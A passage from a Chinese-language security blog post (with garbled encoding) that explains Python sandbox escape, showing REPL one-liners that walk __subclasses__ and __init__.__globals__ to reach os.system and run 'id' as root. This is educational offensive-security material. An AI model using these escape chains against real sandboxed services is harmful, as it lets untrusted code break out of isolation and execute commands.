      <p>è¿™é‡Œé€šè¿‡ <code>__init__.__globals__</code> æ‰¾åˆ°çš„å¹¶ä¸æ˜¯çœŸæ­£çš„ <code>__builtins__</code> æ¨¡å—ï¼Œè€Œæ˜¯<strong>å­—å…¸å½¢å¼çš„ <code>builtins</code> å‘½åç©ºé—´å¿«ç…§</strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>])</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(__builtins__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆé€šè¿‡ <code>__init__.__globals__</code> æ‰¾åˆ°çš„â€œ<code>__builtins__</code> æ¨¡å—â€å¯ä»¥ç›´æ¥é€šè¿‡å­—å…¸çš„å½¢å¼è®¿é—®æ¨¡å—ä¸­çš„å‡½æ•°ï¼Œè€ŒçœŸæ­£çš„ <code>__builtins__</code> æ¨¡å—éœ€è¦é€šè¿‡ <code>__dict__</code> å±æ€§æˆ–è€…ç›´æ¥å±æ€§è®¿é—®ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">&#x27;module&#x27;</span> <span class="built_in">object</span> <span class="keyword">is</span> <span class="keyword">not</span> subscriptable</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.<span class="built_in">eval</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h4 id="os-æ¨¡å—-1"><a href="#os-æ¨¡å—-1" class="headerlink" title="os æ¨¡å—"></a>os æ¨¡å—</h4><p>è€Œ <code>os._wrap_close</code> ç±»æœ¬èº«ä½äºç³»ç»Ÿæ¨¡å—ä¸­ï¼Œå› æ­¤å¯ä»¥ç›´æ¥é€šè¿‡è¯¥ç±»æ‰€åœ¨æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ç›´æ¥æ‰¾åˆ° <code>system</code> å‡½æ•°æ‰§è¡Œå‘½ä»¤ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">137</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">137</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<h4 id="sys-æ¨¡å—"><a href="#sys-æ¨¡å—" class="headerlink" title="sys æ¨¡å—"></a>sys æ¨¡å—</h4><p><code>sys.modules</code> æ˜¯ Python è¿è¡Œæ—¶çš„ä¸€ä¸ª <strong>å…¨å±€å­—å…¸</strong>ï¼Œç”¨æ¥<strong>ç¼“å­˜æ‰€æœ‰å·²ç»å¯¼å…¥çš„æ¨¡å—å¯¹è±¡</strong>ã€‚å®ƒæ˜¯ Python <strong>import æœºåˆ¶çš„æ ¸å¿ƒç¼“å­˜</strong>ï¼Œæ‰€æœ‰æ¨¡å—å¯¼å…¥éƒ½ä¼šç»è¿‡å®ƒã€‚</p>
<blockquote>
<p><code>sys.modules</code> çš„ä½œç”¨æ˜¯<strong>ç¼“å­˜å·²åŠ è½½çš„æ¨¡å—</strong>ã€‚å½“ä½ ç¬¬ä¸€æ¬¡ <code>import</code> ä¸€ä¸ªæ¨¡å—æ—¶ï¼ŒPython ä¼šåŠ è½½å¹¶æ‰§è¡Œè¯¥æ¨¡å—çš„ä»£ç ï¼Œç„¶åå°†æ¨¡å—å¯¹è±¡ä¿å­˜åˆ° <code>sys.modules</code> ä¸­ã€‚ä»¥åå†å¯¼å…¥åŒåæ¨¡å—æ—¶ï¼ŒPython ä¼šç›´æ¥ä» <code>sys.modules</code> é‡Œå–å‡ºå·²æœ‰çš„æ¨¡å—å¯¹è±¡ï¼Œè€Œä¸ä¼šå†æ¬¡åŠ è½½å’Œæ‰§è¡Œæ¨¡å—ä»£ç ã€‚</p>
</blockquote>
<p><code>sys.modules</code> æ˜¯å­—å…¸ç±»å‹ï¼Œå…¶ä¸­ï¼š</p>
<ul>
<li><strong>é”®ï¼ˆkeyï¼‰</strong>ï¼šæ¨¡å—åï¼ˆå­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ <code>&#39;os&#39;</code>ã€<code>&#39;sys&#39;</code>ï¼‰</li>
<li><strong>å€¼ï¼ˆvalueï¼‰</strong>ï¼šæ¨¡å—å¯¹è±¡æœ¬èº«</li>
</ul>
<p>å› æ­¤å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä»å…¨å±€ç©ºé—´ä¸­æ‰¾åˆ° <code>sys</code> æ¨¡å—ä¹Ÿå°±æ‰¾åˆ°äº† <code>modules</code> å…¨å±€å­—å…¸ï¼Œè¿›è€Œæ‰¾åˆ°æ‰€æœ‰çš„æ¨¡å—ã€‚è¿™é‡Œè¿˜æ˜¯ä»¥ <code>warnings.catch_warnings</code> ä¸ºä¾‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>


		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Python æ²™ç®±é€ƒé€¸</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-08-12 00:01:08</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-08-12 00:01:06
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/08/12/Python æ²™ç®±é€ƒé€¸/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/python-web/">#python web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/08/12/Python%20%E5%B8%B8%E8%A7%81%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Python å¸¸è§æ¡†æ¶å®‰å…¨</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/08/11/Pickle%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Pickle ååºåˆ—åŒ–</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Python æ²™ç®±é€ƒé€¸</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%83%E9%80%B8%E7%9B%AE%E6%A0%87"><span class="nav-text">é€ƒé€¸ç›®æ ‡</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">å‘½ä»¤æ‰§è¡Œ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#builtin-%E6%A8%A1%E5%9D%97"><span class="nav-text">builtin æ¨¡å—</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exec%EF%BC%88%E6%89%A7%E8%A1%8C-Python-%E4%BB%A3%E7%A0%81%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89"><span class="nav-text">execï¼ˆæ‰§è¡Œ Python ä»£ç å­—ç¬¦ä¸²ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval%EF%BC%88%E6%B1%82%E5%80%BC%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%89"><span class="nav-text">evalï¼ˆæ±‚å€¼è¡¨è¾¾å¼ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#os-%E6%A8%A1%E5%9D%97"><span class="nav-text">os æ¨¡å—</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#system-popen-%E7%B3%BB%E5%88%97%EF%BC%88%E6%9C%80%E7%9B%B4%E8%A7%82%EF%BC%89"><span class="nav-text">system &#x2F; popen ç³»åˆ—ï¼ˆæœ€ç›´è§‚ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#spawn-posix-spawn-%E7%B3%BB%E5%88%97%EF%BC%88%E7%9B%B4%E6%8E%A5%E8%BF%90%E8%A1%8C%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%EF%BC%89"><span class="nav-text">spawn &#x2F; posix_spawn ç³»åˆ—ï¼ˆç›´æ¥è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec-%E7%B3%BB%E5%88%97%EF%BC%88%E6%9B%BF%E6%8D%A2%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%EF%BC%89"><span class="nav-text">exec* ç³»åˆ—ï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fork-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E5%AD%90%E8%BF%9B%E7%A8%8B%E8%BF%90%E8%A1%8C%EF%BC%89"><span class="nav-text">fork + å‘½ä»¤æ‰§è¡Œï¼ˆå­è¿›ç¨‹è¿è¡Œï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#subprocess-%E6%A8%A1%E5%9D%97"><span class="nav-text">subprocess æ¨¡å—</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Popen-%E7%B3%BB%E5%88%97%EF%BC%88%E5%BA%95%E5%B1%82%E6%9E%84%E9%80%A0%EF%BC%8C%E7%81%B5%E6%B4%BB%E5%BA%A6%E6%9C%80%E9%AB%98%EF%BC%89"><span class="nav-text">Popen ç³»åˆ—ï¼ˆåº•å±‚æ„é€ ï¼Œçµæ´»åº¦æœ€é«˜ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%BB%E5%A1%9E%E6%89%A7%E8%A1%8C%E5%B9%B6%E8%8E%B7%E5%8F%96%E7%8A%B6%E6%80%81-%E8%BE%93%E5%87%BA"><span class="nav-text">é˜»å¡æ‰§è¡Œå¹¶è·å–çŠ¶æ€&#x2F;è¾“å‡º</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#timeit-%E6%A8%A1%E5%9D%97"><span class="nav-text">timeit æ¨¡å—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#platform-%E6%A8%A1%E5%9D%97"><span class="nav-text">platform æ¨¡å—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pty-%E6%A8%A1%E5%9D%97"><span class="nav-text">pty æ¨¡å—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E9%97%A8%E5%91%BD%E4%BB%A4"><span class="nav-text">åé—¨å‘½ä»¤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#help-%E5%87%BD%E6%95%B0"><span class="nav-text">help å‡½æ•°</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#breakpoint-%E5%87%BD%E6%95%B0"><span class="nav-text">breakpoint å‡½æ•°</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%B2%99%E7%AE%B1"><span class="nav-text">å¸¸è§æ²™ç®±</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Python-%E7%A8%8B%E5%BA%8F%E7%BB%93%E6%9E%84"><span class="nav-text">Python ç¨‹åºç»“æ„</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%EF%BC%88Module%EF%BC%89"><span class="nav-text">æ¨¡å—ï¼ˆModuleï¼‰</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8C%85%EF%BC%88Package%EF%BC%89"><span class="nav-text">åŒ…ï¼ˆPackageï¼‰</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%EF%BC%88Namespace%EF%BC%89"><span class="nav-text">å‘½åç©ºé—´ï¼ˆNamespaceï¼‰</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#builtins-%E6%A8%A1%E5%9D%97"><span class="nav-text">builtins æ¨¡å—</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-builtins%EF%BC%9F"><span class="nav-text">ä»€ä¹ˆæ˜¯ builtinsï¼Ÿ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#builtins-%E6%A8%A1%E5%9D%97%E5%86%85%E5%AE%B9"><span class="nav-text">builtins æ¨¡å—å†…å®¹</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%EF%BC%88Built-in-Functions%EF%BC%89"><span class="nav-text">å†…ç½®å‡½æ•°ï¼ˆBuilt-in Functionsï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B%EF%BC%88Built-in-Types%EF%BC%89"><span class="nav-text">å†…ç½®ç±»å‹ï¼ˆBuilt-in Typesï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%BC%82%E5%B8%B8%EF%BC%88Built-in-Exceptions%EF%BC%89"><span class="nav-text">å†…ç½®å¼‚å¸¸ï¼ˆBuilt-in Exceptionsï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%B8%B8%E9%87%8F%EF%BC%88Built-in-Constants%EF%BC%89"><span class="nav-text">å†…ç½®å¸¸é‡ï¼ˆBuilt-in Constantsï¼‰</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">ä½¿ç”¨åœºæ™¯</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-text">åŠ¨æ€ä¿®æ”¹å†…ç½®å‡½æ•°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E5%8F%AF%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-text">æ§åˆ¶å¯ç”¨çš„å†…ç½®å‡½æ•°</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%9C%81%E6%9C%BA%E5%88%B6%EF%BC%88Introspection%EF%BC%89"><span class="nav-text">å†…çœæœºåˆ¶ï¼ˆIntrospectionï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%B1%BB%E5%9E%8B-%E7%BB%93%E6%9E%84"><span class="nav-text">å¯¹è±¡çš„ç±»å‹&#x2F;ç»“æ„</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%B1%A1%E6%88%90%E5%91%98"><span class="nav-text">è·å–å¯¹è±¡æˆå‘˜</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="nav-text">å‘½åç©ºé—´ä¸ä½œç”¨åŸŸ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E6%A1%A3%E4%B8%8E%E5%B8%AE%E5%8A%A9"><span class="nav-text">æ–‡æ¡£ä¸å¸®åŠ©</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#inspect-%E6%A8%A1%E5%9D%97"><span class="nav-text">inspect æ¨¡å—</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%B1%9E%E6%80%A7"><span class="nav-text">é­”æœ¯æ–¹æ³• &#x2F; å±æ€§</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97-%E4%BD%9C%E7%94%A8%E5%9F%9F%E7%9B%B8%E5%85%B3"><span class="nav-text">æ¨¡å— &#x2F; ä½œç”¨åŸŸç›¸å…³</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#builtins"><span class="nav-text">__builtins__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#import"><span class="nav-text">__import__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dict"><span class="nav-text">__dict__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#class"><span class="nav-text">__class__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bases"><span class="nav-text">__bases__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mro"><span class="nav-text">__mro__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#subclasses"><span class="nav-text">__subclasses__()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0-%E6%96%B9%E6%B3%95%E7%9A%84%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">å‡½æ•° &#x2F; æ–¹æ³•çš„æ‰§è¡Œç¯å¢ƒ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#globals"><span class="nav-text">__globals__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#init"><span class="nav-text">__init__</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A0-builtins-%E7%BB%95%E8%BF%87"><span class="nav-text">æ—  builtins ç»•è¿‡</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E8%83%8C%E6%99%AF"><span class="nav-text">é—®é¢˜èƒŒæ™¯</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%86%85%E7%9C%81%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87"><span class="nav-text">é€šè¿‡å†…çœæœºåˆ¶ç»•è¿‡</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-object-%E7%B1%BB"><span class="nav-text">è·å– object ç±»</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-object-%E7%9A%84%E5%8F%AF%E7%94%A8%E5%AD%90%E7%B1%BB"><span class="nav-text">è·å– object çš„å¯ç”¨å­ç±»</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#globals-%E4%B8%AD%E7%9A%84%E5%8F%AF%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="nav-text">globals ä¸­çš„å¯ç”¨æ¨¡å—</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins-%E6%A8%A1%E5%9D%97-1"><span class="nav-text">builtins æ¨¡å—</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os-%E6%A8%A1%E5%9D%97-1"><span class="nav-text">os æ¨¡å—</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sys-%E6%A8%A1%E5%9D%97"><span class="nav-text">sys æ¨¡å—</span></a></li></ol></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        47 posts in total
                    </span>
                    
                        <span>
                            763.4k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="åœ–å±¤_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
